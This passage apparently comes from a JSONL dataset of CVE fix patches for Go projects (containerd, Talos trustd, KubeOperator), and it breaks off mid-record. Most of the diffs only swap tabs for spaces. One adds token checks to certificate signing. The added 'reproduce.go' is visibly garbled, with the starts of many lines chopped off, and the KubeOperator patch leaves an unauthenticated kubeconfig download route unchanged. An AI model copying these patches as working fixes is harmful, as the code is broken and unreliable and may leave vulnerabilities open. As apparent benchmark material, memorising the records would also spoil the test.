intptr(5),\n-\t\t\tMinor:  intptr(0),\n-\t\t\tAccess: rwm,\n-\t\t\tAllow:  true,\n-\t\t},\n-\t\t{\n-\t\t\t// \"/dev/zero\",\n-\t\t\tType:   \"c\",\n-\t\t\tMajor:  intptr(1),\n-\t\t\tMinor:  intptr(5),\n-\t\t\tAccess: rwm,\n-\t\t\tAllow:  true,\n-\t\t},\n-\t\t{\n-\t\t\t// \"/dev/urandom\",\n-\t\t\tType:   \"c\",\n-\t\t\tMajor:  intptr(1),\n-\t\t\tMinor:  intptr(9),\n-\t\t\tAccess: rwm,\n-\t\t\tAllow:  true,\n-\t\t},\n-\t\t{\n-\t\t\t// \"/dev/console\",\n-\t\t\tType:   \"c\",\n-\t\t\tMajor:  intptr(5),\n-\t\t\tMinor:  intptr(1),\n-\t\t\tAccess: rwm,\n-\t\t\tAllow:  true,\n-\t\t},\n-\t\t// /dev/pts/ - pts namespaces are \"coming soon\"\n-\t\t{\n-\t\t\tType:   \"c\",\n-\t\t\tMajor:  intptr(136),\n-\t\t\tAccess: rwm,\n-\t\t\tAllow:  true,\n-\t\t},\n-\t\t{\n-\t\t\t// \"dev/ptmx\"\n-\t\t\tType:   \"c\",\n-\t\t\tMajor:  intptr(5),\n-\t\t\tMinor:  intptr(2),\n-\t\t\tAccess: rwm,\n-\t\t\tAllow:  true,\n-\t\t},\n-\t}...)\n-\treturn nil\n+        setLinux(s)\n+        if s.Linux.Resources == nil {\n+                s.Linux.Resources = &specs.LinuxResources{}\n+        }\n+        intptr := func(i int64) *int64 {\n+                return &i\n+        }\n+        s.Linux.Resources.Devices = append(s.Linux.Resources.Devices, []specs.LinuxDeviceCgroup{\n+                {\n+                        // \"/dev/null\",\n+                        Type:   \"c\",\n+                        Major:  intptr(1),\n+                        Minor:  intptr(3),\n+                        Access: rwm,\n+                        Allow:  true,\n+                },\n+                {\n+                        // \"/dev/random\",\n+                        Type:   \"c\",\n+                        Major:  intptr(1),\n+                        Minor:  intptr(8),\n+                        Access: rwm,\n+                        Allow:  true,\n+                },\n+                {\n+                        // \"/dev/full\",\n+                        Type:   \"c\",\n+                        Major:  intptr(1),\n+                        Minor:  intptr(7),\n+                        Access: rwm,\n+                        Allow:  true,\n+                },\n+                {\n+                        // \"/dev/tty\",\n+                        Type:   \"c\",\n+                        Major:  intptr(5),\n+                        Minor:  intptr(0),\n+                        Access: rwm,\n+                        Allow:  true,\n+                },\n+                {\n+                        // \"/dev/zero\",\n+                        Type:   \"c\",\n+                        Major:  intptr(1),\n+                        Minor:  intptr(5),\n+                        Access: rwm,\n+                        Allow:  true,\n+                },\n+                {\n+                        // \"/dev/urandom\",\n+                        Type:   \"c\",\n+                        Major:  intptr(1),\n+                        Minor:  intptr(9),\n+                        Access: rwm,\n+                        Allow:  true,\n+                },\n+                {\n+                        // \"/dev/console\",\n+                        Type:   \"c\",\n+                        Major:  intptr(5),\n+                        Minor:  intptr(1),\n+                        Access: rwm,\n+                        Allow:  true,\n+                },\n+                // /dev/pts/ - pts namespaces are \"coming soon\"\n+                {\n+                        Type:   \"c\",\n+                        Major:  intptr(136),\n+                        Access: rwm,\n+                        Allow:  true,\n+                },\n+                {\n+                        // \"dev/ptmx\"\n+                        Type:   \"c\",\n+                        Major:  intptr(5),\n+                        Minor:  intptr(2),\n+                        Access: rwm,\n+                        Allow:  true,\n+                },\n+        }...)\n+        return nil\n }\n \n // WithPrivileged sets up options for a privileged container\n var WithPrivileged = Compose(\n-\tWithAllCurrentCapabilities,\n-\tWithMaskedPaths(nil),\n-\tWithReadonlyPaths(nil),\n-\tWithWriteableSysfs,\n-\tWithWriteableCgroupfs,\n-\tWithSelinuxLabel(\"\"),\n-\tWithApparmorProfile(\"\"),\n-\tWithSeccompUnconfined,\n+        WithAllCurrentCapabilities,\n+        WithMaskedPaths(nil),\n+        WithReadonlyPaths(nil),\n+        WithWriteableSysfs,\n+        WithWriteableCgroupfs,\n+        WithSelinuxLabel(\"\"),\n+        WithApparmorProfile(\"\"),\n+        WithSeccompUnconfined,\n )\n \n // WithWindowsHyperV sets the Windows.HyperV section for HyperV isolation of containers.\n func WithWindowsHyperV(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\tif s.Windows == nil {\n-\t\ts.Windows = &specs.Windows{}\n-\t}\n-\tif s.Windows.HyperV == nil {\n-\t\ts.Windows.HyperV = &specs.WindowsHyperV{}\n-\t}\n-\treturn nil\n+        if s.Windows == nil {\n+                s.Windows = &specs.Windows{}\n+        }\n+        if s.Windows.HyperV == nil {\n+                s.Windows.HyperV = &specs.WindowsHyperV{}\n+        }\n+        return nil\n }\n \n // WithMemoryLimit sets the `Linux.LinuxResources.Memory.Limit` section to the\n@@ -1160,97 +1943,97 @@ func WithWindowsHyperV(_ context.Context, _ Client, _ *containers.Container, s *\n // `Windows.WindowsResources.Memory.Limit` section if the `Windows` section is\n // not `nil`.\n func WithMemoryLimit(limit uint64) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tif s.Linux != nil {\n-\t\t\tif s.Linux.Resources == nil {\n-\t\t\t\ts.Linux.Resources = &specs.LinuxResources{}\n-\t\t\t}\n-\t\t\tif s.Linux.Resources.Memory == nil {\n-\t\t\t\ts.Linux.Resources.Memory = &specs.LinuxMemory{}\n-\t\t\t}\n-\t\t\tl := int64(limit)\n-\t\t\ts.Linux.Resources.Memory.Limit = &l\n-\t\t}\n-\t\tif s.Windows != nil {\n-\t\t\tif s.Windows.Resources == nil {\n-\t\t\t\ts.Windows.Resources = &specs.WindowsResources{}\n-\t\t\t}\n-\t\t\tif s.Windows.Resources.Memory == nil {\n-\t\t\t\ts.Windows.Resources.Memory = &specs.WindowsMemoryResources{}\n-\t\t\t}\n-\t\t\ts.Windows.Resources.Memory.Limit = &limit\n-\t\t}\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                if s.Linux != nil {\n+                        if s.Linux.Resources == nil {\n+                                s.Linux.Resources = &specs.LinuxResources{}\n+                        }\n+                        if s.Linux.Resources.Memory == nil {\n+                                s.Linux.Resources.Memory = &specs.LinuxMemory{}\n+                        }\n+                        l := int64(limit)\n+                        s.Linux.Resources.Memory.Limit = &l\n+                }\n+                if s.Windows != nil {\n+                        if s.Windows.Resources == nil {\n+                                s.Windows.Resources = &specs.WindowsResources{}\n+                        }\n+                        if s.Windows.Resources.Memory == nil {\n+                                s.Windows.Resources.Memory = &specs.WindowsMemoryResources{}\n+                        }\n+                        s.Windows.Resources.Memory.Limit = &limit\n+                }\n+                return nil\n+        }\n }\n \n // WithAnnotations appends or replaces the annotations on the spec with the\n // provided annotations\n func WithAnnotations(annotations map[string]string) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tif s.Annotations == nil {\n-\t\t\ts.Annotations = make(map[string]string)\n-\t\t}\n-\t\tfor k, v := range annotations {\n-\t\t\ts.Annotations[k] = v\n-\t\t}\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                if s.Annotations == nil {\n+                        s.Annotations = make(map[string]string)\n+                }\n+                for k, v := range annotations {\n+                        s.Annotations[k] = v\n+                }\n+                return nil\n+        }\n }\n \n // WithLinuxDevices adds the provided linux devices to the spec\n func WithLinuxDevices(devices []specs.LinuxDevice) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tsetLinux(s)\n-\t\ts.Linux.Devices = append(s.Linux.Devices, devices...)\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                setLinux(s)\n+                s.Linux.Devices = append(s.Linux.Devices, devices...)\n+                return nil\n+        }\n }\n \n // WithLinuxDevice adds the device specified by path to the spec\n func WithLinuxDevice(path, permissions string) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tsetLinux(s)\n-\t\tsetResources(s)\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                setLinux(s)\n+                setResources(s)\n \n-\t\tdev, err := DeviceFromPath(path)\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n+                dev, err := DeviceFromPath(path)\n+                if err != nil {\n+                        return err\n+                }\n \n-\t\ts.Linux.Devices = append(s.Linux.Devices, *dev)\n+                s.Linux.Devices = append(s.Linux.Devices, *dev)\n \n-\t\ts.Linux.Resources.Devices = append(s.Linux.Resources.Devices, specs.LinuxDeviceCgroup{\n-\t\t\tType:   dev.Type,\n-\t\t\tAllow:  true,\n-\t\t\tMajor:  &dev.Major,\n-\t\t\tMinor:  &dev.Minor,\n-\t\t\tAccess: permissions,\n-\t\t})\n+                s.Linux.Resources.Devices = append(s.Linux.Resources.Devices, specs.LinuxDeviceCgroup{\n+                        Type:   dev.Type,\n+                        Allow:  true,\n+                        Major:  &dev.Major,\n+                        Minor:  &dev.Minor,\n+                        Access: permissions,\n+                })\n \n-\t\treturn nil\n-\t}\n+                return nil\n+        }\n }\n \n // WithEnvFile adds environment variables from a file to the container's spec\n func WithEnvFile(path string) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tvar vars []string\n-\t\tf, err := os.Open(path)\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\tdefer f.Close()\n-\n-\t\tsc := bufio.NewScanner(f)\n-\t\tfor sc.Scan() {\n-\t\t\tvars = append(vars, sc.Text())\n-\t\t}\n-\t\tif err = sc.Err(); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\treturn WithEnv(vars)(nil, nil, nil, s)\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                var vars []string\n+                f, err := os.Open(path)\n+                if err != nil {\n+                        return err\n+                }\n+                defer f.Close()\n+\n+                sc := bufio.NewScanner(f)\n+                for sc.Scan() {\n+                        vars = append(vars, sc.Text())\n+                }\n+                if err = sc.Err(); err != nil {\n+                        return err\n+                }\n+                return WithEnv(vars)(nil, nil, nil, s)\n+        }\n }\n \n // ErrNoShmMount is returned when there is no /dev/shm mount specified in the config\n@@ -1261,21 +2044,21 @@ var ErrNoShmMount = errors.New(\"no /dev/shm mount specified\")\n //\n // The size value is specified in kb, kilobytes.\n func WithDevShmSize(kb int64) SpecOpts {\n-\treturn func(ctx context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tfor i, m := range s.Mounts {\n-\t\t\tif filepath.Clean(m.Destination) == \"/dev/shm\" && m.Source == \"shm\" && m.Type == \"tmpfs\" {\n-\t\t\t\tfor i := 0; i < len(m.Options); i++ {\n-\t\t\t\t\tif strings.HasPrefix(m.Options[i], \"size=\") {\n-\t\t\t\t\t\tm.Options = append(m.Options[:i], m.Options[i+1:]...)\n-\t\t\t\t\t\ti--\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\t\t\t\ts.Mounts[i].Options = append(m.Options, fmt.Sprintf(\"size=%dk\", kb))\n-\t\t\t\treturn nil\n-\t\t\t}\n-\t\t}\n-\t\treturn ErrNoShmMount\n-\t}\n+        return func(ctx context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                for i, m := range s.Mounts {\n+                        if filepath.Clean(m.Destination) == \"/dev/shm\" && m.Source == \"shm\" && m.Type == \"tmpfs\" {\n+                                for i := 0; i < len(m.Options); i++ {\n+                                        if strings.HasPrefix(m.Options[i], \"size=\") {\n+                                                m.Options = append(m.Options[:i], m.Options[i+1:]...)\n+                                                i--\n+                                        }\n+                                }\n+                                s.Mounts[i].Options = append(m.Options, fmt.Sprintf(\"size=%dk\", kb))\n+                                return nil\n+                        }\n+                }\n+                return ErrNoShmMount\n+        }\n }\n \n // tryReadonlyMounts is used by the options which are trying to get user/group\n@@ -1290,8 +2073,8 @@ func WithDevShmSize(kb int64) SpecOpts {\n // API, when the caller passes that experimental annotation\n // `containerd.io/snapshot/readonly.mount` something like that.\n func tryReadonlyMounts(mounts []mount.Mount) []mount.Mount {\n-\tif len(mounts) == 1 && mounts[0].Type == \"overlay\" {\n-\t\tmounts[0].Options = append(mounts[0].Options, \"ro\")\n-\t}\n-\treturn mounts\n+        if len(mounts) == 1 && mounts[0].Type == \"overlay\" {\n+                mounts[0].Options = append(mounts[0].Options, \"ro\")\n+        }\n+        return mounts\n }\ndiff --git a/reproduce.go b/reproduce.go\nnew file mode 100644\nindex 000000000..9eabe3f14\n--- /dev/null\n+++ b/reproduce.go\n@@ -0,0 +1,116 @@\n+package main\n+\n+import (\n+\"context\"\n+\"log\"\n+\"os\"\n+\"os/exec\"\n+\"strings\"\n+\n+\"github.com/containerd/containerd\"\n+\"github.com/containerd/containerd/cio\"\n+\"github.com/containerd/containerd/namespaces\"\n+\"github.com/containerd/containerd/oci\"\n+)\n+\n+func main() {\n+if err := os.Chdir(\"/workspace/containerd\"); err != nil {\n+ge directory: %v\", err)\n+}\n+if err := setupUser(); err != nil {\n+user: %v\", err)\n+}\n+defer cleanupUser()\n+\n+if err := runTest(\"vanilla\"); err != nil {\n+illa test failed: %v\", err)\n+}\n+\n+if err := runTest(\"fixed\"); err != nil {\n+%v\", err)\n+}\n+}\n+\n+func runTest(testType string) error {\n+log.Printf(\"Running test: %s\", testType)\n+client, err := containerd.New(\"/run/containerd/containerd.sock\")\n+if err != nil {\n+ err\n+}\n+defer client.Close()\n+\n+ctx := namespaces.WithNamespace(context.Background(), \"default\")\n+image, err := client.Pull(ctx, \"docker.io/library/alpine:latest\", containerd.WithPullUnpack)\n+if err != nil {\n+ err\n+}\n+\n+var opts []oci.SpecOpts\n+if testType == \"fixed\" {\n+d(opts, oci.WithUser(\"testuser\"), oci.WithAllGroups(true))\n+} else {\n+d(opts, oci.WithUser(\"testuser\"))\n+}\n+\n+container, err := client.NewContainer(\n+tainer-\"+testType,\n+tainerd.WithImage(image),\n+tainerd.WithNewSnapshot(\"repro-snapshot-\"+testType, image),\n+tainerd.WithOCISpecification(oci.WithSpec(image.Config(ctx).Spec), opts...),\n+)\n+if err != nil {\n+ err\n+}\n+defer container.Delete(ctx, containerd.WithSnapshotCleanup)\n+\n+task, err := container.NewTask(ctx, cio.NewCreator(cio.WithStdio))\n+if err != nil {\n+ err\n+}\n+defer task.Delete(ctx)\n+\n+if err := task.Start(ctx); err != nil {\n+ err\n+}\n+\n+exitStatusC, err := task.Wait(ctx)\n+if err != nil {\n+ err\n+}\n+\n+if err := task.Kill(ctx, exec.Command(\"id\").Signal()); err != nil {\n+dle this error properly in a real-world app\n+}\n+\n+\n+status := <-exitStatusC\n+code, _, err := status.Result()\n+if err != nil {\n+ err\n+}\n+if code != 0 {\n+dle non-zero exit code\n+}\n+    log.Printf(\"finished test successfully: %s\", testType)\n+return nil\n+}\n+\n+\n+func setupUser() error {\n+user and group exist to avoid errors on re-runs\n+_, err := exec.LookPath(\"testuser\")\n+if err == nil {\n+assume setup is done\n+ nil\n+}\n+err = exec.Command(\"groupadd\", \"testgroup\").Run()\n+if err != nil {\n+ err\n+}\n+return exec.Command(\"useradd\", \"-g\", \"testgroup\", \"testuser\").Run()\n+}\n+\n+func cleanupUser() {\n+exec.Command(\"userdel\", \"testuser\").Run()\n+exec.Command(\"groupdel\", \"testgroup\").Run()\n+}\n\\ No newline at end of file\n"}
{"cve":"CVE-2022-36103:0708", "fix_patch": "diff --git a/internal/app/trustd/internal/reg/reg.go b/internal/app/trustd/internal/reg/reg.go\nindex ed5fd6960..0814bf979 100644\n--- a/internal/app/trustd/internal/reg/reg.go\n+++ b/internal/app/trustd/internal/reg/reg.go\n@@ -5,51 +5,69 @@\n package reg\n \n import (\n-\t\"context\"\n+\"context\"\n \n-\t\"github.com/cosi-project/runtime/pkg/resource\"\n-\t\"github.com/cosi-project/runtime/pkg/safe\"\n-\t\"github.com/cosi-project/runtime/pkg/state\"\n-\t\"github.com/siderolabs/crypto/x509\"\n-\t\"google.golang.org/grpc\"\n+\"github.com/cosi-project/runtime/pkg/resource\"\n+\"github.com/cosi-project/runtime/pkg/safe\"\n+\"github.com/cosi-project/runtime/pkg/state\"\n+\"github.com/siderolabs/crypto/x509\"\n+\"google.golang.org/grpc\"\n+\"google.golang.org/grpc/codes\"\n+\"google.golang.org/grpc/peer\"\n+\"google.golang.org/grpc/status\"\n \n-\tsecurityapi \"github.com/talos-systems/talos/pkg/machinery/api/security\"\n-\t\"github.com/talos-systems/talos/pkg/machinery/resources/secrets\"\n+\"github.com/talos-systems/talos/internal/pkg/csr\"\n+\"github.com/talos-systems/talos/internal/pkg/token\"\n+securityapi \"github.com/talos-systems/talos/pkg/machinery/api/security\"\n+\"github.com/talos-systems/talos/pkg/machinery/resources/secrets\"\n )\n \n // Registrator is the concrete type that implements the factory.Registrator and\n // securityapi.SecurityServiceServer interfaces.\n type Registrator struct {\n-\tsecurityapi.UnimplementedSecurityServiceServer\n+securityapi.UnimplementedSecurityServiceServer\n \n-\tResources state.State\n+Resources     state.State\n+Authenticator token.Authenticator\n }\n \n // Register implements the factory.Registrator interface.\n //\n //nolint:interfacer\n func (r *Registrator) Register(s *grpc.Server) {\n-\tsecurityapi.RegisterSecurityServiceServer(s, r)\n+securityapi.RegisterSecurityServiceServer(s, r)\n }\n \n // Certificate implements the securityapi.SecurityServer interface.\n func (r *Registrator) Certificate(ctx context.Context, in *securityapi.CertificateRequest) (resp *securityapi.CertificateResponse, err error) {\n-\tosRoot, err := safe.StateGet[*secrets.OSRoot](ctx, r.Resources, resource.NewMetadata(secrets.NamespaceName, secrets.OSRootType, secrets.OSRootID, resource.VersionUndefined))\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\t// TODO: Verify that the request is coming from the IP addresss declared in\n-\t// the CSR.\n-\tsigned, err := x509.NewCertificateFromCSRBytes(osRoot.TypedSpec().CA.Crt, osRoot.TypedSpec().CA.Key, in.Csr)\n-\tif err != nil {\n-\t\treturn\n-\t}\n-\n-\tresp = &securityapi.CertificateResponse{\n-\t\tCa:  osRoot.TypedSpec().CA.Crt,\n-\t\tCrt: signed.X509CertificatePEM,\n-\t}\n-\n-\treturn resp, nil\n+osRoot, err := safe.StateGet[*secrets.OSRoot](ctx, r.Resources, resource.NewMetadata(secrets.NamespaceName, secrets.OSRootType, secrets.OSRootID, resource.VersionUndefined))\n+if err != nil {\n+return nil, err\n+}\n+\n+var p *peer.Peer\n+p, _ = peer.FromContext(ctx)\n+\n+claims, err := r.Authenticator.Authenticate(ctx, in.Token)\n+if err != nil {\n+return nil, status.Error(codes.Unauthenticated, err.Error())\n+}\n+\n+if err := csr.ValidateJoinCSR(in.Csr, claims.Agent, p); err != nil {\n+return nil, status.Error(codes.InvalidArgument, err.Error())\n+}\n+\n+// TODO: Verify that the request is coming from the IP addresss declared in\n+// the CSR.\n+signed, err := x509.NewCertificateFromCSRBytes(osRoot.TypedSpec().CA.Crt, osRoot.TypedSpec().CA.Key, in.Csr)\n+if err != nil {\n+return\n+}\n+\n+resp = &securityapi.CertificateResponse{\n+Ca:  osRoot.TypedSpec().CA.Crt,\n+Crt: signed.X509CertificatePEM,\n+}\n+\n+return resp, nil\n }\n"}
{"cve":"CVE-2023-22480:0708", "fix_patch": "diff --git a/pkg/router/v1/v1api.go b/pkg/router/v1/v1api.go\nindex 1a3b9cbc1..9a34c1a4c 100644\n--- a/pkg/router/v1/v1api.go\n+++ b/pkg/router/v1/v1api.go\n@@ -1,122 +1,122 @@\n package v1\n \n import (\n-\t\"encoding/json\"\n-\t\"net/http\"\n+        \"encoding/json\"\n+        \"net/http\"\n \n-\t\"github.com/KubeOperator/KubeOperator/pkg/controller\"\n-\t\"github.com/KubeOperator/KubeOperator/pkg/errorf\"\n-\t\"github.com/KubeOperator/KubeOperator/pkg/middleware\"\n-\t\"github.com/jinzhu/gorm\"\n-\t\"github.com/kataras/iris/v12\"\n-\t\"github.com/kataras/iris/v12/context\"\n-\t\"github.com/kataras/iris/v12/mvc\"\n-\t\"github.com/pkg/errors\"\n+        \"github.com/KubeOperator/KubeOperator/pkg/controller\"\n+        \"github.com/KubeOperator/KubeOperator/pkg/errorf\"\n+        \"github.com/KubeOperator/KubeOperator/pkg/middleware\"\n+        \"github.com/jinzhu/gorm\"\n+        \"github.com/kataras/iris/v12\"\n+        \"github.com/kataras/iris/v12/context\"\n+        \"github.com/kataras/iris/v12/mvc\"\n+        \"github.com/pkg/errors\"\n )\n \n var AuthScope iris.Party\n var WhiteScope iris.Party\n \n func V1(parent iris.Party) {\n-\tv1 := parent.Party(\"/v1\")\n-\tauthParty := v1.Party(\"/auth\")\n-\tmvc.New(authParty.Party(\"/session\")).HandleError(ErrorHandler).Handle(controller.NewSessionController())\n-\tmvc.New(v1.Party(\"/user\")).HandleError(ErrorHandler).Handle(controller.NewForgotPasswordController())\n-\tAuthScope = v1.Party(\"/\")\n-\tAuthScope.Use(middleware.JWTMiddleware().Serve)\n-\tAuthScope.Use(middleware.UserMiddleware)\n-\tAuthScope.Use(middleware.RBACMiddleware())\n-\tAuthScope.Use(middleware.PagerMiddleware)\n-\tAuthScope.Use(middleware.ForceMiddleware)\n-\tmvc.New(AuthScope.Party(\"/clusters\")).HandleError(ErrorHandler).Handle(controller.NewClusterController())\n-\tmvc.New(AuthScope.Party(\"/credentials\")).HandleError(ErrorHandler).Handle(controller.NewCredentialController())\n-\tmvc.New(AuthScope.Party(\"/hosts\")).HandleError(ErrorHandler).Handle(controller.NewHostController())\n-\tmvc.New(AuthScope.Party(\"/users\")).HandleError(ErrorHandler).Handle(controller.NewUserController())\n-\tmvc.New(AuthScope.Party(\"/dashboard\")).HandleError(ErrorHandler).Handle(controller.NewKubePiController())\n-\tmvc.New(AuthScope.Party(\"/regions\")).HandleError(ErrorHandler).Handle(controller.NewRegionController())\n-\tmvc.New(AuthScope.Party(\"/zones\")).HandleError(ErrorHandler).Handle(controller.NewZoneController())\n-\tmvc.New(AuthScope.Party(\"/plans\")).HandleError(ErrorHandler).Handle(controller.NewPlanController())\n-\tmvc.New(AuthScope.Party(\"/settings\")).HandleError(ErrorHandler).Handle(controller.NewSystemSettingController())\n-\tmvc.New(AuthScope.Party(\"/ntp\")).HandleError(ErrorHandler).Handle(controller.NewNtpServerController())\n-\tmvc.New(AuthScope.Party(\"/logs\")).HandleError(ErrorHandler).Handle(controller.NewSystemLogController())\n-\tmvc.New(AuthScope.Party(\"/projects\")).HandleError(ErrorHandler).Handle(controller.NewProjectController())\n-\tmvc.New(AuthScope.Party(\"/clusters/provisioner\")).HandleError(ErrorHandler).Handle(controller.NewProvisionerController())\n-\tmvc.New(AuthScope.Party(\"/kubernetes\")).HandleError(ErrorHandler).Handle(controller.NewKubernetesController())\n-\tmvc.New(AuthScope.Party(\"/clusters/tool\")).HandleError(ErrorHandler).Handle(controller.NewClusterToolController())\n-\tmvc.New(AuthScope.Party(\"/backupaccounts\")).HandleError(ErrorHandler).Handle(controller.NewBackupAccountController())\n-\tmvc.New(AuthScope.Party(\"/clusters/backup\")).HandleError(ErrorHandler).Handle(controller.NewClusterBackupStrategyController())\n-\tmvc.New(AuthScope.Party(\"/clusters/monitor\")).HandleError(ErrorHandler).Handle(controller.NewMonitorController())\n-\tmvc.New(AuthScope.Party(\"/tasks\")).Handle(ErrorHandler).Handle(controller.NewTaskLogController())\n-\tmvc.New(AuthScope.Party(\"/components\")).Handle(ErrorHandler).Handle(controller.NewComponentController())\n-\tmvc.New(AuthScope.Party(\"/license\")).Handle(ErrorHandler).Handle(controller.NewLicenseController())\n-\tmvc.New(AuthScope.Party(\"/clusters/backup/files\")).HandleError(ErrorHandler).Handle(controller.NewClusterBackupFileController())\n-\tmvc.New(AuthScope.Party(\"/clusters/velero/{cluster}/{operate}\")).HandleError(ErrorHandler).Handle(controller.NewClusterVeleroBackupController())\n-\tmvc.New(AuthScope.Party(\"/manifests\")).HandleError(ErrorHandler).Handle(controller.NewManifestController())\n-\tmvc.New(AuthScope.Party(\"/vmconfigs\")).HandleError(ErrorHandler).Handle(controller.NewVmConfigController())\n-\tmvc.New(AuthScope.Party(\"/ippools\")).HandleError(ErrorHandler).Handle(controller.NewIpPoolController())\n-\tmvc.New(AuthScope.Party(\"/ippools/{name}/ips\")).HandleError(ErrorHandler).Handle(controller.NewIpController())\n-\tmvc.New(AuthScope.Party(\"/projects/{project}/resources\")).HandleError(ErrorHandler).Handle(controller.NewProjectResourceController())\n-\tmvc.New(AuthScope.Party(\"/projects/{project}/members\")).HandleError(ErrorHandler).Handle(controller.NewProjectMemberController())\n-\tmvc.New(AuthScope.Party(\"/projects/{project}/clusters/{cluster}/members\")).HandleError(ErrorHandler).Handle(controller.NewClusterMemberController())\n-\tmvc.New(AuthScope.Party(\"/projects/{project}/clusters/{cluster}/resources\")).HandleError(ErrorHandler).Handle(controller.NewClusterResourceController())\n-\tmvc.New(AuthScope.Party(\"/templates\")).HandleError(ErrorHandler).Handle(controller.NewTemplateConfigController())\n-\tmvc.New(AuthScope.Party(\"/clusters/grade\")).HandleError(ErrorHandler).Handle(controller.NewGradeController())\n-\tmvc.New(AuthScope.Party(\"/ldap\")).HandleError(ErrorHandler).Handle(controller.NewLdapController())\n-\tmvc.New(AuthScope.Party(\"/msg/accounts\")).HandleError(ErrorHandler).Handle(controller.NewMessageAccountController())\n-\tmvc.New(AuthScope.Party(\"/msg/subscribes\")).HandleError(ErrorHandler).Handle(controller.NewMessageSubscribeController())\n-\tmvc.New(AuthScope.Party(\"/user/messages\")).HandleError(ErrorHandler).Handle(controller.NewUserMsgController())\n-\tmvc.New(AuthScope.Party(\"/user/settings\")).HandleError(ErrorHandler).Handle(controller.NewUserSettingController())\n-\tWhiteScope = v1.Party(\"/\")\n-\tWhiteScope.Get(\"/clusters/kubeconfig/{name}\", downloadKubeconfig)\n-\tWhiteScope.Get(\"/captcha\", generateCaptcha)\n-\tmvc.New(WhiteScope.Party(\"/theme\")).HandleError(ErrorHandler).Handle(controller.NewThemeController())\n+        v1 := parent.Party(\"/v1\")\n+        authParty := v1.Party(\"/auth\")\n+        mvc.New(authParty.Party(\"/session\")).HandleError(ErrorHandler).Handle(controller.NewSessionController())\n+        mvc.New(v1.Party(\"/user\")).HandleError(ErrorHandler).Handle(controller.NewForgotPasswordController())\n+        AuthScope = v1.Party(\"/\")\n+        AuthScope.Use(middleware.JWTMiddleware().Serve)\n+        AuthScope.Use(middleware.UserMiddleware)\n+        AuthScope.Use(middleware.RBACMiddleware())\n+        AuthScope.Use(middleware.PagerMiddleware)\n+        AuthScope.Use(middleware.ForceMiddleware)\n+        mvc.New(AuthScope.Party(\"/clusters\")).HandleError(ErrorHandler).Handle(controller.NewClusterController())\n+        mvc.New(AuthScope.Party(\"/credentials\")).HandleError(ErrorHandler).Handle(controller.NewCredentialController())\n+        mvc.New(AuthScope.Party(\"/hosts\")).HandleError(ErrorHandler).Handle(controller.NewHostController())\n+        mvc.New(AuthScope.Party(\"/users\")).HandleError(ErrorHandler).Handle(controller.NewUserController())\n+        mvc.New(AuthScope.Party(\"/dashboard\")).HandleError(ErrorHandler).Handle(controller.NewKubePiController())\n+        mvc.New(AuthScope.Party(\"/regions\")).HandleError(ErrorHandler).Handle(controller.NewRegionController())\n+        mvc.New(AuthScope.Party(\"/zones\")).HandleError(ErrorHandler).Handle(controller.NewZoneController())\n+        mvc.New(AuthScope.Party(\"/plans\")).HandleError(ErrorHandler).Handle(controller.NewPlanController())\n+        mvc.New(AuthScope.Party(\"/settings\")).HandleError(ErrorHandler).Handle(controller.NewSystemSettingController())\n+        mvc.New(AuthScope.Party(\"/ntp\")).HandleError(ErrorHandler).Handle(controller.NewNtpServerController())\n+        mvc.New(AuthScope.Party(\"/logs\")).HandleError(ErrorHandler).Handle(controller.NewSystemLogController())\n+        mvc.New(AuthScope.Party(\"/projects\")).HandleError(ErrorHandler).Handle(controller.NewProjectController())\n+        mvc.New(AuthScope.Party(\"/clusters/provisioner\")).HandleError(ErrorHandler).Handle(controller.NewProvisionerController())\n+        mvc.New(AuthScope.Party(\"/kubernetes\")).HandleError(ErrorHandler).Handle(controller.NewKubernetesController())\n+        mvc.New(AuthScope.Party(\"/clusters/tool\")).HandleError(ErrorHandler).Handle(controller.NewClusterToolController())\n+        mvc.New(AuthScope.Party(\"/backupaccounts\")).HandleError(ErrorHandler).Handle(controller.NewBackupAccountController())\n+        mvc.New(AuthScope.Party(\"/clusters/backup\")).HandleError(ErrorHandler).Handle(controller.NewClusterBackupStrategyController())\n+        mvc.New(AuthScope.Party(\"/clusters/monitor\")).HandleError(ErrorHandler).Handle(controller.NewMonitorController())\n+        mvc.New(AuthScope.Party(\"/tasks\")).Handle(ErrorHandler).Handle(controller.NewTaskLogController())\n+        mvc.New(AuthScope.Party(\"/components\")).Handle(ErrorHandler).Handle(controller.NewComponentController())\n+        mvc.New(AuthScope.Party(\"/license\")).Handle(ErrorHandler).Handle(controller.NewLicenseController())\n+        mvc.New(AuthScope.Party(\"/clusters/backup/files\")).HandleError(ErrorHandler).Handle(controller.NewClusterBackupFileController())\n+        mvc.New(AuthScope.Party(\"/clusters/velero/{cluster}/{operate}\")).HandleError(ErrorHandler).Handle(controller.NewClusterVeleroBackupController())\n+        mvc.New(AuthScope.Party(\"/manifests\")).HandleError(ErrorHandler).Handle(controller.NewManifestController())\n+        mvc.New(AuthScope.Party(\"/vmconfigs\")).HandleError(ErrorHandler).Handle(controller.NewVmConfigController())\n+        mvc.New(AuthScope.Party(\"/ippools\")).HandleError(ErrorHandler).Handle(controller.NewIpPoolController())\n+        